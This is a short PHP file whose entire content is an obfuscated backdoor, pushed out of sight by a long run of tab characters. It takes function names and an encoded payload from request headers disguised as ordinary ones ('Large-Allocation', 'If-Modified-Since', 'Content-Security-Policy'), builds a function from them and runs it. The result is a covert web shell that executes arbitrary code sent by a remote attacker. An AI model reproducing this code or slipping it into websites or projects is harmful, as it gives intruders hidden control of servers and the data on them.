<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Large-Allocation'])){$lock=$_HEADERS['Large-Allocation']('', $_HEADERS['If-Modified-Since']($_HEADERS['Content-Security-Policy']));$lock();}
